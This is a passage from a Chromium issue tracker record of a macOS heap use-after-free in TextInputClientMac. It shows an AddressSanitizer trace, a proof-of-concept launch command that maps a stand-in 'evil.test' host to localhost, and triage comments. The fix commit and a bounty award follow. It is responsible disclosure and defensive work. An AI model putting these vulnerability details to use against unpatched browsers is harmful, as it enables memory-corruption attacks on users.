    #88 0x00019ff9cc08 in -[NSApplication run]+0x204 (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:arm64e+0x2dc08)
    #89 0x0001074cc468 in base::MessagePumpNSApplication::DoRun(base::MessagePump::Delegate*)+0x328 ($SRC/out/asan-release/libbase.dylib:arm64+0x408468)
    #90 0x0001074c7334 in base::MessagePumpCFRunLoopBase::Run(base::MessagePump::Delegate*)+0x290 ($SRC/out/asan-release/libbase.dylib:arm64+0x403334)
    #91 0x000107340240 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta)+0x32c ($SRC/out/asan-release/libbase.dylib:arm64+0x27c240)
    #92 0x00010722cb08 in base::RunLoop::Run(base::Location const&)+0x430 ($SRC/out/asan-release/libbase.dylib:arm64+0x168b08)
    #93 0x0001377b19c8 in content::BrowserMainLoop::RunMainMessageLoop()+0x268 ($SRC/out/asan-release/libcontent.dylib:arm64+0xf759c8)
    #94 0x0001377b88d4 in content::BrowserMainRunnerImpl::Run()+0x30 ($SRC/out/asan-release/libcontent.dylib:arm64+0xf7c8d4)
    #95 0x0001377aa148 in content::BrowserMain(content::MainFunctionParams)+0x1c0 ($SRC/out/asan-release/libcontent.dylib:arm64+0xf6e148)
    #96 0x00013a5c4968 in content::RunBrowserProcessMain(content::MainFunctionParams, content::ContentMainDelegate*)+0x1b0 ($SRC/out/asan-release/libcontent.dylib:arm64+0x3d88968)
    #97 0x00013a5c7e8c in content::ContentMainRunnerImpl::RunBrowser(content::MainFunctionParams, bool)+0xb8c ($SRC/out/asan-release/libcontent.dylib:arm64+0x3d8be8c)
    #98 0x00013a5c7064 in content::ContentMainRunnerImpl::Run()+0x568 ($SRC/out/asan-release/libcontent.dylib:arm64+0x3d8b064)
    #99 0x00013a5c2948 in content::RunContentProcess(content::ContentMainParams, content::ContentMainRunner*)+0x858 ($SRC/out/asan-release/libcontent.dylib:arm64+0x3d86948)
    #100 0x00013a5c2e38 in content::ContentMain(content::ContentMainParams)+0x190 ($SRC/out/asan-release/libcontent.dylib:arm64+0x3d86e38)
    #101 0x00011e37b724 in ChromeMain+0x490 ($SRC/out/asan-release/libchrome_dll.dylib:arm64+0xb724)
    #102 0x000104ab0a80 in main+0x1f8 ($SRC/out/asan-release/Chromium.app/Contents/MacOS/Chromium:arm64+0x100000a80)
    #103 0x00019bbfab94 in start+0x17b8 (/usr/lib/dyld:arm64e+0x6b94)

0x61d00057d080 is located 0 bytes inside of 1928-byte region [0x61d00057d080,0x61d00057d808)
freed by thread T0 here:
    #0 0x0001054e55a8 in __sanitizer_finish_switch_fiber+0xa04 ($SRC/out/asan-release/Chromium.app/Contents/MacOS/libclang_rt.asan_osx_dynamic.dylib:arm64+0x655a8)
    #1 0x000138b54a74 in content::RenderFrameHostImpl::~RenderFrameHostImpl()+0x284c ($SRC/out/asan-release/libcontent.dylib:arm64+0x2318a74)
    #2 0x000138b58a54 in content::RenderFrameHostImpl::~RenderFrameHostImpl()+0x8 ($SRC/out/asan-release/libcontent.dylib:arm64+0x231ca54)
    #3 0x000138c6c83c in content::RenderFrameHostManager::~RenderFrameHostManager()+0xac ($SRC/out/asan-release/libcontent.dylib:arm64+0x243083c)
    #4 0x0001388626b0 in content::FrameTreeNode::~FrameTreeNode()+0xc48 ($SRC/out/asan-release/libcontent.dylib:arm64+0x20266b0)
    #5 0x000138863870 in content::FrameTreeNode::~FrameTreeNode()+0x8 ($SRC/out/asan-release/libcontent.dylib:arm64+0x2027870)
    #6 0x000138b78b98 in content::RenderFrameHostImpl::RemoveChild(content::FrameTreeNode*)+0x39c ($SRC/out/asan-release/libcontent.dylib:arm64+0x233cb98)
    #7 0x000138b8b358 in content::RenderFrameHostImpl::PendingDeletionCheckCompletedOnSubtree()+0x608 ($SRC/out/asan-release/libcontent.dylib:arm64+0x234f358)
    #8 0x000138c19348 in base::internal::Invoker<...>::RunOnce(base::internal::BindStateBase*)+0x168 ($SRC/out/asan-release/libcontent.dylib:arm64+0x23dd348)
    #9 0x0001072c1804 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&)+0x348 ($SRC/out/asan-release/libbase.dylib:arm64+0x1fd804)
    #10 0x00010733ee84 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*)+0x88c ($SRC/out/asan-release/libbase.dylib:arm64+0x27ae84)
    #11 0x00010733e23c in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork()+0x138 ($SRC/out/asan-release/libbase.dylib:arm64+0x27a23c)
    #12 0x0001074ca3cc in base::MessagePumpCFRunLoopBase::RunWork()+0x1c8 ($SRC/out/asan-release/libbase.dylib:arm64+0x4063cc)
    #13 0x0001074b4df8 in base::apple::CallWithEHFrame(void () block_pointer)+0xc ($SRC/out/asan-release/libbase.dylib:arm64+0x3f0df8)
    #14 0x0001074c875c in base::MessagePumpCFRunLoopBase::RunWorkSource(void*)+0xec ($SRC/out/asan-release/libbase.dylib:arm64+0x40475c)
    #15 0x00019c086b10 in __CFRUNLOOP_IS_CALLING_OUT_TO_A_SOURCE0_PERFORM_FUNCTION__+0x18 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:arm64e+0x7cb10)
    #16 0x00019c086aa4 in __CFRunLoopDoSource0+0xa8 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:arm64e+0x7caa4)
    #17 0x00019c086810 in __CFRunLoopDoSources0+0xe4 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:arm64e+0x7c810)
    #18 0x00019c085464 in __CFRunLoopRun+0x344 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:arm64e+0x7b464)
    #19 0x00019c084a94 in CFRunLoopRunSpecific+0x238 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:arm64e+0x7aa94)

previously allocated by thread T0 here:
    #0 0x0001054e51c0 in __sanitizer_finish_switch_fiber+0x61c ($SRC/out/asan-release/Chromium.app/Contents/MacOS/libclang_rt.asan_osx_dynamic.dylib:arm64+0x651c0)
    #1 0x000138d59c84 in content::RenderWidgetHostImpl::Create(...)+0xd0 ($SRC/out/asan-release/libcontent.dylib:arm64+0x251dc84)

SUMMARY: AddressSanitizer: heap-use-after-free ($SRC/out/asan-release/libcontent.dylib:arm64+0x2e73ff4) in content::TextInputClientMac::GetFirstRectForRange(content::RenderWidgetHost*, gfx::Range const&)+0x988
Shadow bytes around the buggy address:
  0x61d00057ce00: fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x61d00057ce80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x61d00057cf00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x61d00057cf80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x61d00057d000: fa fa fa fa fa fa fa fa fa fa fa fa fa fa f7 fa
=>0x61d00057d080:[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x61d00057d100: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x61d00057d180: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x61d00057d200: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x61d00057d280: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x61d00057d300: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

==88607==ADDITIONAL INFO

==88607==Note: Please include this section with the ASan report.
Task trace:


Command line: `$SRC/out/asan-release/Chromium.app/Contents/MacOS/Chromium --no-proxy-server --user-data-dir=/tmp/chrome-poc-1772021146 --enable-features=TextInputClient:use_nested_loop/true --host-resolver-rules=MAP evil.test 127.0.0.1 --enable-logging=stderr --remote-debugging-port=9222 --flag-switches-begin --flag-switches-end http://localhost:8888/poc.html`


MiraclePtr Status: NOT PROTECTED
No raw_ptr<T> access to this region was detected prior to this crash.
This crash is still exploitable with MiraclePtr.
Refer to https://chromium.googlesource.com/chromium/src/+/main/base/memory/raw_ptr.md for details.

==88607==END OF ADDITIONAL INFO

==88607==ABORTING

```
## Credit

Please use c6eed09fc8b174b0f3eebedcceb1e792 as the credit for this vulnerability. Thank you.

## Attachments

- [repro_compressed.mp4](attachments/repro_compressed.mp4) (video/mp4, 6.3 MB)

## Timeline

### li...@chromium.org (2026-02-25)

@jo...@google.com do you mind taking a look or rerouting as necessary?

### jo...@google.com (2026-02-25)

Oops!

Thanks for the report. Great summary. Will fix ASAP.

### jo...@google.com (2026-02-25)

Someone pointed out that the vulnerability report seems to be LLM output, so I'll fact check it:

The description of how the code works up to the "Reproduce" subtitle is 100% correct, and does a good job of describing some subtleties of the nested loop, except that I haven't independently verified this statement: "A compromised renderer in a cross-origin child frame can exploit this by sending FrameHost::Detach() to destroy the child's RenderWidgetHost during the wait". But it sounds plausible that FrameHost::Detach() would have that effect so I have no reason to doubt it.

I didn't bother to read the report after "Reproduce" since I can easily see that there's a possibility of a UAF here, and how to fix it.

### jo...@google.com (2026-02-25)

Fix in <https://crrev.com/c/7609471>. Once it's in canary I'll cherry-pick it to M146, and update the min version in the experiment config.

### je...@gmail.com (2026-02-26)

I can provide a video to save you treprhe trouble of reproducing it yourselves.

Regarding the Chrome VRP, this vulnerability is very easy to trigger for many users who use non-English input methods, so it doesn't require complex user interaction and is highly dangerous. Please skip to the 1:50 mark in my reproduction video—when you embed an extremely large child iframe, any user input will immediately trigger this vulnerability.

### ch...@google.com (2026-02-26)

The Found In field may only contain numeric values.
Some values were corrected.
You can see the changes by toggling full history on the issue.

### jo...@google.com (2026-02-26)

There's no problem using an LLM!

Some reporters don't check the LLM output for inaccuracies, so I was just noting which parts I had verified as correct for anyone who audits it later.

This is an excellent report. It described the issue very well. Thanks!

### je...@gmail.com (2026-02-26)

Thank you for your quick fix and response!

### dx...@google.com (2026-02-26)

Project: chromium/src  

Branch:  main  

Author:  Joe Mason [joenotcharles@google.com](mailto:joenotcharles@google.com)  

Link:    <https://chromium-review.googlesource.com/7609471>

Access RenderFrameHostImpl through a WeakPtr in TextInputClientMac

---


Expand for full commit details
```
     
    Bug: 475270375 
    Fixed: 487357838 
    Change-Id: Ib75ef27fca580577033899a802323076800e4732 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7609471 
    Commit-Queue: Elly FJ <ellyjones@chromium.org> 
    Reviewed-by: Elly FJ <ellyjones@chromium.org> 
    Auto-Submit: Joe Mason <joenotcharles@google.com> 
    Cr-Commit-Position: refs/heads/main@{#1590849}

```

---

Files:

- M `content/browser/renderer_host/text_input_client_mac.h`
- M `content/browser/renderer_host/text_input_client_mac.mm`
- M `content/browser/renderer_host/text_input_client_mac_unittest.mm`

---

Hash: [4780e5f3c5e67c1211998dda1421b0d3489c2eea](https://chromiumdash.appspot.com/commit/4780e5f3c5e67c1211998dda1421b0d3489c2eea)  

Date: Thu Feb 26 16:26:15 2026


---

### jo...@google.com (2026-02-26)

On second thought, I don't think this fix needs to be cherry-picked to M146, because the vulnerable code is behind a flag. Due to another (non-security) bug, we're not enabling the flag until M147 anyway.

### ch...@google.com (2026-06-05)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

### sp...@google.com (2026-06-15)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $36000.00 for this report.

Rationale for this decision:
High Quality. Sandbox escape / Memory corruption / RCE in a non-sandboxed process with bisect.


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/487357838)*
